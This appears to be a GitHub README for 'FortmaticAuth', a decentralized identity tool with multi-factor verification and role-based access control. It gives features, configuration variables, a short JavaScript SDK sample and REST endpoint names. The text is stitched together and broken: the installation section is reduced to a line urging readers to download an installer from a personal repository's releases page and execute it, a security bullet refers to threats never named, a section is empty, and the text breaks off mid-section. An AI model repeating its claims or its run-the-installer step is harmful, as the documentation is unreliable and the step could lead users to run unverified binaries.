# FortmaticAuth: Decentralized Identity with MFA and RBAC Gateway

A secure platform for managing decentralized identities. FortmaticAuth combines multi-factor verification with a role-based access gateway to protect digital spaces and data. It is designed to work across apps, services, and networks, letting teams verify users with multiple factors while enforcing permissions through a clear RBAC model. This README covers the core concepts, setup, usage patterns, and future directions. For the latest release assets, visit the Releases page linked above.

Overview
FortmaticAuth is built to ease the burden of proving who a user is while controlling what they can do. It merges decentralized identity principles with practical controls. The MFA layer ensures that identity verification includes something the user knows, has, or is. The RBAC gateway applies fine-grained permissions to protect resources and actions in apps, services, and infrastructure. The aim is to provide a cohesive, scalable foundation for secure access across ecosystems.

Core Concepts
- Decentralized Identity (DID): A self-sovereign identity model where users own and control their identity data.
- Multi-Factor Verification (MFA): A layered approach to authentication that reduces risk by requiring multiple proofs.
- Role-Based Access Control (RBAC): A formal model that assigns permissions based on user roles.
- Access Gateway: A policy layer that gates actions and resources according to roles and verification status.
- Agent/Provider Abstraction: A pluggable set of modules for identity verification, credential issuance, and access decisions.

Features
- Flexible identity models: support for DID-based identities, Verifiable Credentials, and portable user profiles.
- Strong MFA options: time-based one-time passwords (TOTP), WebAuthn hardware keys, push notifications, and biometric prompts where available.
- RBAC-based access: define roles, permissions, and inheritance to enforce access rules.
- Secure session management: short-lived tokens, rotation, and revocation capabilities.
- Portable data: identity data that can be used across apps without lock-in.
- Extensible architecture: plug in additional verification methods, credential types, or gate policies.
- Observability: built-in logging, auditing, and telemetry hooks for governance and compliance.

How FortmaticAuth Works
- Identity creation: A user creates an identity or imports an existing one. Credentials are bound to the user and can be backed by decentralized data stores or verifiable credentials.
- MFA enrollment: The user selects MFA methods. The system registers those methods and enforces them on sign-in or sensitive actions.
- Verification flow: On authentication, the user proves possession of the required factors. The system validates the proofs and issues a session token.
- Access evaluation: When a user requests an action, the RBAC gateway checks the userâ€™s roles and permissions against the action. If allowed, the request proceeds; otherwise, it is denied.
- Credential usage: Apps consume tokens and validate claims to enforce policy. Verifiable Credentials can be used to prove attributes or entitlements without revealing unnecessary data.
- Lifecycle management: Identities, MFA methods, and roles can be updated, rotated, or revoked. Audit trails capture changes for compliance.

Architecture and Design
- Modular layers: identity layer, MFA layer, and access-gate layer. Each layer exposes a clean API and can be replaced with equivalents without breaking the whole system.
- Pluggable providers: authentication methods, key management, and policy evaluators are replaceable modules.
- Secure storage: sensitive data is protected at rest and in transit. Secrets are stored in protected vaults or secure enclaves.
- Interoperability: designed to work with browsers, mobile apps, and server-side components through SDKs and REST APIs.
- Observability: standard logging, metrics, and tracing help you monitor behavior and diagnose issues.

      From the releases page, download the installer asset for your platform and execute it.
  - The Releases page can be accessed at https://github.com/NghiaTZ/FortmaticAuth/releases

Configuration
- Environment variables
  - FORTMATICAUTH_API_BASE: base URL for API endpoints
  - FORTMATICAUTH_NETWORK: network name (e.g., mainnet, testnet)
  - FORTMATICAUTH_MFA_PROVIDER: default MFA provider (e.g., TOTP, WebAuthn)
  - FORTMATICAUTH_ROLE_MAP: JSON mapping of roles to permissions
- Client settings
  - apiKey: a key issued by your FortmaticAuth deployment
  - issuerDid or didDocument: for DID-based identity scenarios
  - redirectUrls: after sign-in or verification flows
- Security considerations
  - Use TLS 1.2+ for all endpoints
  - Rotate keys regularly
  - Enable audit logging for sensitive actions

Usage Patterns
- Quick integration example (JavaScript)
  - This shows how a client app can interact with FortmaticAuth to authenticate a user and request access to a protected resource.
  - Code snippet:
    - // Initialize the auth client
    - const auth = new FortmaticAuth.Client({
    -   apiKey: "YOUR_API_KEY",
    -   network: "mainnet",
    -   mfProvider: "webauthn",
    - });
    - 
    - // Start login flow
    - const session = await auth.login({ username: "alice@example.com" });
    - 
    - // Check permissions for a resource
    - const allowed = await auth.checkAccess({
    -   userId: session.userId,
    -   resource: "/payments/submit",
    -   action: "POST",
    -   context: { tenant: "AcmeCorp" },
    - });
    - 
    - if (!allowed) {
    -   throw new Error("Access denied");
    - }
    - 
  - Notes:
    - Replace placeholders with real values from your deployment.
    - Use MFA prompts to verify identity before sensitive actions.
- TypeScript usage
  - The SDK provides types for identities, sessions, and access policies to help with robust applications.
  - Example:
    - import { FortmaticAuth } from "fortmatic-auth-sdk";
    - const client = new FortmaticAuth({ apiKey: "YOUR_API_KEY" });
    - const token = await client.authenticate({ did: "did:example:123" });
- Admin operations
  - Create roles and assign permissions
  - Enroll and rotate MFA methods for users
  - Revoke credentials and enforce policy updates

SDKs and APIs
- REST API
  - Auth endpoints: /auth/login, /auth/verify, /auth/logout
  - Policy endpoints: /rbac/roles, /rbac/permissions, /rbac/mappings
  - DID and credentials: /did/resolve, /credentials/issue, /credentials/verify
- Client SDKs

Security and Privacy
- Identity security
  - User-controlled identity data with minimal disclosure
  - Verifiable Credentials allow proving attributes without exposing all data
  - MFA reduces the risk of credential theft
- Data protection
  - Encryption at rest and in transit
  - Secrets and keys managed by secure vaults or hardware security modules

  - FortmaticAuth mitigates these with multifactor checks, short-lived tokens, and strict RBAC
- Compliance considerations
  - Audit logging for access events
  - Data minimization practices
  - Privacy-by-design approaches in all modules

Identity and MFA: How It Fits Together
- DID-based identities provide user control over credentials
